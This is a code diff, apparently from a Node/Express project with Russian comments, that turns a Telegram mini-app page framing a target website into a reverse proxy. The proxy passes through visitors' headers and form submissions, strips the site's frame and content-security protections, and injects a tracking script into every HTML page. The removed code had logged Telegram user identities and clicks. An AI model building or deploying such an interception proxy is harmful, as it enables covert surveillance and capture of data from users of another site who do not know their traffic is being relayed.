@@ -161,113 +161,91 @@ const trackerScript = `
 </script>
 `;
 
-// Главная страница с iframe
-app.get('/', (req, res) => {
-  res.send(`
-<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Loading...</title>
-  <script src="https://telegram.org/js/telegram-web-app.js"></script>
-  <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body, html { width: 100%; height: 100%; overflow: hidden; }
-    #site-frame { 
-      width: 100%; 
-      height: 100%; 
-      border: none; 
-      display: block;
-    }
-    #loader {
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      text-align: center;
-      font-family: sans-serif;
-      z-index: 9999;
-      background: white;
-      padding: 20px;
-      border-radius: 10px;
-    }
-  </style>
-</head>
-<body>
-  <div id="loader">⏳ Загрузка...</div>
-  <iframe id="site-frame" src="${TARGET_SITE}" sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-modals"></iframe>
+// Простой прокси для всех запросов
+app.use((req, res, next) => {
+  // Пропускаем API
+  if (req.path === '/api/log') {
+    return next();
+  }
   
-  <script>
-    const tg = window.Telegram?.WebApp;
-    if (tg) {
-      tg.ready();
-      tg.expand();
+  const https = require('https');
+  const http = require('http');
+  
+  const targetUrl = TARGET_SITE + req.url;
+  const urlObj = new URL(targetUrl);
+  
+  const options = {
+    hostname: urlObj.hostname,
+    port: urlObj.port,
+    path: urlObj.pathname + urlObj.search,
+    method: req.method,
+    headers: {
+      ...req.headers,
+      host: urlObj.hostname
     }
+  };
+  
+  delete options.headers['host'];
+  
+  const protocol = urlObj.protocol === 'https:' ? https : http;
+  
+  const proxyReq = protocol.request(options, (proxyRes) => {
+    const contentType = proxyRes.headers['content-type'] || '';
     
-    const frame = document.getElementById('site-frame');
-    const loader = document.getElementById('loader');
-    
-    // Скрываем лоадер когда iframe загрузится
-    frame.onload = () => {
-      loader.style.display = 'none';
+    // Только для HTML модифицируем
+    if (contentType.includes('text/html')) {
+      let body = '';
       
-      // Пробуем получить доступ к содержимому iframe для трекинга
-      try {
-        const iframeDoc = frame.contentDocument || frame.contentWindow.document;
-        const telegramUser = tg?.initDataUnsafe?.user || null;
-        const sessionId = 'sess_' + Math.random().toString(36).substr(2, 9);
+      proxyRes.on('data', chunk => {
+        body += chunk.toString();
+      });
+      
+      proxyRes.on('end', () => {
+        // Добавляем base tag
+        if (body.includes('<head>')) {
+          body = body.replace('<head>', '<head><base href="' + TARGET_SITE + '/">');
+        }
         
-        // Логируем открытие
-        fetch('/api/log', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            sessionId,
-            telegramUser,
-            eventType: 'pageview',
-            element: 'iframe_loaded',
-            value: '${TARGET_SITE}',
-            pageUrl: location.href
-          })
-        }).catch(() => {});
+        // Убираем X-Frame-Options из мета тегов
+        body = body.replace(/<meta[^>]*http-equiv=["']X-Frame-Options["'][^>]*>/gi, '');
         
-        // Отслеживаем клики внутри iframe
-        iframeDoc.addEventListener('click', (e) => {
-          const el = e.target;
-          const tag = el.tagName?.toLowerCase() || 'unknown';
-          const text = el.innerText?.slice(0, 50) || '';
-          
-          fetch('/api/log', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              sessionId,
-              telegramUser,
-              eventType: 'click',
-              element: tag,
-              value: text,
-              pageUrl: frame.contentWindow.location.href
-            })
-          }).catch(() => {});
-        });
+        // Проверяем Cloudflare
+        const isCloudflare = body.includes('cf-challenge') || body.includes('Just a moment');
         
-      } catch (e) {
-        // CORS блокирует доступ к iframe - это нормально
-        console.log('Cannot access iframe content (CORS)');
-      }
-    };
-    
-    // Если долго грузится
-    setTimeout(() => {
-      if (loader.style.display !== 'none') {
-        loader.innerHTML = '⏳ Загрузка...<br><small>Может потребоваться пройти проверку</small>';
-      }
-    }, 3000);
-  </script>
-</body>
-</html>
-  `);
+        // Добавляем трекер если не Cloudflare
+        if (!isCloudflare && body.includes('</body>')) {
+          body = body.replace('</body>', trackerScript + '</body>');
+        }
+        
+        // Убираем проблемные заголовки
+        const headers = { ...proxyRes.headers };
+        delete headers['x-frame-options'];
+        delete headers['content-security-policy'];
+        delete headers['content-length'];
+        
+        res.writeHead(proxyRes.statusCode, headers);
+        res.end(body);
+      });
+    } else {
+      // Для остального просто передаём
+      const headers = { ...proxyRes.headers };
+      delete headers['x-frame-options'];
+      
+      res.writeHead(proxyRes.statusCode, headers);
+      proxyRes.pipe(res);
+    }
+  });
+  
+  proxyReq.on('error', (err) => {
+    console.error('Proxy error:', err);
+    res.status(500).send('Error: ' + err.message);
+  });
+  
+  if (req.method === 'POST' || req.method === 'PUT') {
+    req.pipe(proxyReq);
+  } else {
+    proxyReq.end();
+  }
 });
 
 // API логирования
